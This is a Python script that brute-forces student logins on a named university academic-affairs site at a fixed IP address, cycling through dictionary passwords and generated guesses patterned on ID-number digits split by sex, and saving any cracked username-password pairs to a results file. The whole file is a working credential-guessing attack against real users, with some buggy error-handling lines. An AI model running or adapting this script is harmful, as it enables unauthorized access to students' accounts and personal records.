#! /usr/bin/env python3
# -*- coding:utf-8 -*-

'''

This program is for blasting 59.77.226.32 using the method of ergodic.
You can also user your own dictionary by adding the abspath of the dictionary.
You should tell program which user you want to blast by adding the abspath of the SQL.txt
for example:
user: 011501101 sex: male(or female)
user: 011501102 sex: female

'''

import os, re, time
from urllib import request, parse, error

def MaleDictionary():
	for x in range(32)[1:]:
		for y in range(100):
			for z in range(1, 10, 2):
				for w in ('0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'x'):
					yield (format(x, '02d') + format(y, '02d') + str(z) + w)

def FemaleDictionary():
	for x in range(32)[1:]:
		for y in range(100):
			for z in range(0, 10, 2):
				for w in ('0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'x'):
					yield (format(x, '02d') + format(y, '02d') + str(z) + w)

def Blasting():
	url = 'http://59.77.226.32/logincheck.asp'
	head = {
		'User-Agent': 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)',
		'Accept': 'text/html',
		'Accept-Language': 'en-US,en;q=0.5',
		'Accept-Encoding': 'gzip, deflate',
		'DNT': '1',
		'Referer': 'http://jwch.fzu.edu.cn/',
		'Cookie': 'ASPSESSIONIDSATDARTQ=NFFMALJBPNBBLNGMHOMBLDPG'
	}
	data = {'Content-Type': 'application/x-www-form-urlencoded', 'muser': '', 'passwd': '', 'x': '0', 'y': '0'}
	re_pass = re.compile('福州大学教务处本科教学管理系统')
	re_user = re.compile('^user:\s*(\d{9})\s*sex:\s*(male|female)$')
	t = -1

	path = os.path.abspath('.')
	r = open(path + '/BlastingResult.txt', 'a')

	muser = []
	fuser = []
	SQLpath = input('Please enter the abspath of the SQL: ')
	s = open(SQLpath)
	for x in s.readlines() 	:
		y = re_user.match(x)
		if y.group(2) == 'male':
			muser.append(y.group(1))
		else :
			fuser.append(y.group(1))
	s.close()

	dictpath = input('Please enter the abspath of your dictionary(or press enter): ')	
	passwd = []
	if dictpath != '':
		t = input('1: Only using dictionary given for blasting;\n2: if dictionary is useless, traverse.\n enter your choice: ')
		d = open(dictpath)
		for x in d.readlines()[:-1] :
			passwd.append(x)

	if t != -1:
		for user in muser:
			data['muser'] = user
			for x in passwd:
				data['passwd'] = x[:-1]
				req = request.Request(url, headers = head)
				print('Try password: %s for user: %s' % (data['passwd'], data['muser']))
				time.sleep(0.5)
				try :
					response = request.urlopen(req, data = parse.urlencode(data).encode('utf-8'))	
				except error.HTTPError as e:
					req = request.Ruequest(response.geturl(), headers = head)
					response = request.urlopen(req, data = parse.urlencode(data).encode('utf-8'))
				if re_pass.search(response.read().decode(encoding = 'utf-8', errors = 'ignore')):
					r.write('user: %s\tpassword: %s\n' % (data['muser'], data['passwd']))
					r.flush()
					print('Get the password of user: %s' % user)
					muser.remove(user)
					break
		for user in fuser:
			data['muser'] = user
			for x in passwd:
				data['passwd'] = x[:-1]
				req = request.Request(url, headers = head)
				print('Try password: %s for user: %s' % (data['passwd'], data['muser']))
				time.sleep(0.5)
				try :
					response = request.urlopen(req, data = parse.urlencode(data).encode('utf-8'))	
				except error.HTTPError as e:
					req = request.Ruequest(response.geturl(), headers = head)
					response = request.urlopen(req, data = parse.urlencode(data).encode('utf-8'))
				if re_pass.search(response.read().decode(encoding = 'utf-8', errors = 'ignore')):
					r.write('user: %s\tpassword: %s\n' % (data['muser'], data['passwd']))
					r.flush()
					print('Get the password of user: %s' % user)
					fuser.remove(user)
					break

	if t != 1:
		for user in muser:
			data['muser'] = user
			for x in MaleDictionary():
				data['passwd'] = x
				req = request.Request(url, headers = head)
				time.sleep(0.5)
				print('Try password: %s for user: %s' % (data['passwd'], data['muser']))
				try :
					response = request.urlopen(req, data = parse.urlencode(data).encode('utf-8'))	
				except error.HTTPError as e:
					req = request.Ruequest(response.geturl(), headers = head)
					response = request.urlopen(req, data = parse.urlencode(data).encode('utf-8'))
				if re_pass.search(response.read().decode(encoding = 'utf-8', errors = 'ignore')):
					r.write('user: %s\tpassword: %s\n' % (data['muser'], data['passwd']))
					r.flush()
					print('Get the password of user: %s' % user)
					muser.remove(user)
					break
		for user in fuser:
			data['muser'] = user
			for x in FemaleDictionary():
				data['passwd'] = x
				req = request.Request(url, headers = head)
				print('Try password: %s for user: %s' % (data['passwd'], data['muser']))
				time.sleep(0.5)
				try :
					response = request.urlopen(req, data = parse.urlencode(data).encode('utf-8'))	
				except error.HTTPError as e:
					req = request.Ruequest(response.geturl(), headers = head)
					response = request.urlopen(req, data = parse.urlencode(data).encode('utf-8'))
				if re_pass.search(response.read().decode(encoding = 'utf-8', errors = 'ignore')):
					r.write('user: %s\tpassword: %s\n' % (data['muser'], data['passwd']))
					r.flush()
					print('Get the password of user: %s' % user)
					fuser.remove(user)
					break

	r.close()

if __name__ == '__main__':

	print('Welcome to Blasting......')
	Blasting()
